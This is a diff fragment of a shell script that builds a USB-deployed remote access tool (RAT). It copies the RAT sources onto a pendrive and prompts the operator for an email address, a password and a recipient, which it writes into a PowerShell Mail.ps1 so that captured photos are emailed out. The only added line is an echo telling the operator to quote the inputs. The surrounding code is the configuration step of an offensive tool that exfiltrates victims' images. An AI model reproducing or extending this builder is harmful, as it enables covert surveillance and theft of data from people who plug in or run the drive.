@@ -83,6 +83,7 @@ copy_content_to_pendrive() {
 		    ;;
                 4)
                     cp -r "$RAT_SRC_DIR"/* "$selected_pendrive"
+                    echo -e "[#] PUT EVERYTHING REQUESTED IN QUOTES"
                     echo -e "\$username=$(read -p "off/usb/conf/email> Enter the email to be used for sending messages: " email; echo $email)" >> "$selected_pendrive"/Mail.ps1
                     echo -e "\$password=$(read -p "off/usb/conf/password> Enter the email password: " password; echo $password)" >> "$selected_pendrive"/Mail.ps1
                     echo -e "\$msg.To.Add=$(read -p "off/usb/conf/receiver> Enter the email to which the photos should be sent: " recipient; echo $recipient)" >> "$selected_pendrive"/Mail.ps1
